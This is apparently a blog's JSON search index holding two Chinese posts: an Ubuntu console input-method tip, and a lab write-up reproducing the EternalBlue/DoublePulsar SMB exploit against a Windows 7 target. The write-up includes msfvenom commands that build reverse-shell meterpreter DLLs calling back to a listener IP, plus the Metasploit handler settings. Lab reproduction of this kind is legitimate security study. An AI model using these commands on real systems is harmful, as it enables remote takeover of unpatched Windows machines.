[{"title":"Ubuntu DOS界面使用中文输入法","url":"http://118.24.162.88/2018/07/04/Ubuntu DOS界面使用中文输入法/","content":"<p>在ubuntu非图形界面下输入中文的方法：</p>\n<p>1、安装一个输入法，以搜狗输入法为例。在终端下操作：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install fcitx im-switch fbterm fcitx-frontend-fbterm</span><br></pre></td></tr></table></figure>\n<p>2、以前的版本在安装完成后需要配置用户目录下的.fbtermrc文件，现在不需要了。安装完成后直接通过ctrl+space即可切换成中文输入法。如果切换无效，可以输入fcitx回车，完成后就可以通过ctrl+space切换中文输入了。</p>\n","categories":["玩转Linux"],"tags":[]},{"title":"方程式SMB漏洞复现","url":"http://118.24.162.88/2018/07/04/方程式SMB漏洞复现/","content":"<p>利用条件，目标系统window10以下，开启了文件共享。实验环境如下：</p>\n<p>1、 攻击机，windows10，64位，IP地址 192.168.46.1</p>\n<p>2、 监听机，ubuntu，64位，IP地址 192.168.46.139</p>\n<p>3、 靶机，win7sp3，32位，IP 192.168.46.129</p>\n<p>在复现之前首先要对fb.py文件进行一些修改，将27，28，29，72行代码注释掉。</p>\n<a id=\"more\"></a>\n<p><img src=\"images/1.png\" alt=\"1\"></p>\n<p><img src=\"images/2.png\" alt=\"2\"></p>\n<p>首先在攻击机上运行fb.py脚本。</p>\n<p><img src=\"images/3.png\" alt=\"3\"> </p>\n<p>Target IP输入靶机IP，Callback IP 输入攻击机得IP，Use Redirection选择no。 </p>\n<p><img src=\"images/4.png\" alt=\"4\"></p>\n<p>之后选择新创建项目，自己输入项目名，下一个直接默认回车。 </p>\n<p><img src=\"images/5.png\" alt=\"5\"></p>\n<p>选择Eternalblue模块，之后一路默认回车直到让选择目标系统和位数时自己根据情况选择，然后继续默认回车。 </p>\n<p><img src=\"images/6.png\" alt=\"6\"></p>\n<p><img src=\"images/7.png\" alt=\"7\"></p>\n<p><img src=\"images/8.png\" alt=\"8\"></p>\n<p>输入 use Doublepulsar 使用 Doublepulsar插件，之后一路回车到选择项。 </p>\n<p><img src=\"images/9.png\" alt=\"9\"></p>\n<p>选择SMB后门，位数根据靶机自己选择，操作选择rundll。</p>\n<p><img src=\"images/10.png\" alt=\"10\"></p>\n<p>到这里面我们可以暂时不管攻击机了，转向监听机。首先用ubuntu生成一个恶意得dll文件。具体命令为： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.46.139 LPORT=5555 -f dll &gt; /home/ryweer/1.dll</span><br></pre></td></tr></table></figure>\n<p><img src=\"images/11.png\" alt=\"11\"></p>\n<p>IP是监听机得IP，端口自己设置。生成之后将1.dll文件导出到攻击机处。在打开msf加载exploit/multi/handler。 </p>\n<p><img src=\"images/12.png\" alt=\"12\"></p>\n<p>设置监听ip位监听机ip，监听端口为dll设置得端口，指令为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set lhost 192.168.46.139</span><br><span class=\"line\">set lport 5555</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"images/13.png\" alt=\"13\"></p>\n<p>监听机已经开始监听，这是我们再返回攻击机，设置dll路径为之前导出得dll路径，之后一路回车。 </p>\n<p><img src=\"images/14.png\" alt=\"14\"></p>\n<p>执行插件是却发现失败了。 </p>\n<p><img src=\"images/15.png\" alt=\"15\"></p>\n<p>这个问题在我复现过程中困扰了很久。DLL Architecture is: 64 bit ，看报错似乎是dll是64位的问题，仔细想靶机为32位，那就是我们在生成dll过程中出现了问题，返回查看发现应该在生成dll时吧x64去掉，换成如下命令再次重复一次。 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.46.139 LPORT=2222 -f dll &gt; /home/ryweer/2.dll</span><br></pre></td></tr></table></figure>\n<p><img src=\"images/16.png\" alt=\"16\"></p>\n<p><img src=\"images/17.png\" alt=\"17\"></p>\n<p>监听机已成功检测到一个shell，复现成功。但是靶机已经检测到，自动重启了系统。估计是系统版本太高，后又在xp系统上测试成功。看来win10以下通杀也只是理论上的。</p>\n<p>这里需要注意的是如果靶机位64位系统的话，在使用msf时要加一句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>\n<p>32位的系统不用。 </p>\n","categories":["网络安全"],"tags":["网络安全"]},{"title":"category","url":"http://118.24.162.88/category/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://118.24.162.88/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://118.24.162.88/search/index.html","content":"","categories":[],"tags":[]}]